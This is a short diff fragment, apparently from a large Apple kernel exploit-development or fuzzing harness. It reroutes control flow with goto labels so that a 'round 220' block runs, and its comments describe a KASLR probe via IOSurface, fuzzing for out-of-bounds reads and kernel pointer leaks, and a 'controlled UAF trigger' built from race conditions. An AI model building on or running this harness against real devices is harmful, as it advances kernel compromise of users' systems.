@@ -20192,8 +20192,9 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 220) {
+        if (rounds >= 170 && rounds != 219) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
+            if (rounds == 220) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26511,6 +26512,7 @@ new_modes:
                 rlog("=== r=218 complete ===\n");
             }
 
+            r220_block:
             /* r=220: Controlled UAF trigger — minimal v_race8+v_big with reclaim
              *
              * Strategy: The Phase 13 crash proves v_race8 x3 + v_big x2 triggers
@@ -26728,6 +26730,7 @@ new_modes:
                 IOObjectRelease(svc220);
                 r220_done:
                 rlog("=== r=220 complete ===\n");
+                goto phase17_done;
             }
 
             /* r=216: Multi-thread multi-conn race (real surfaces) */
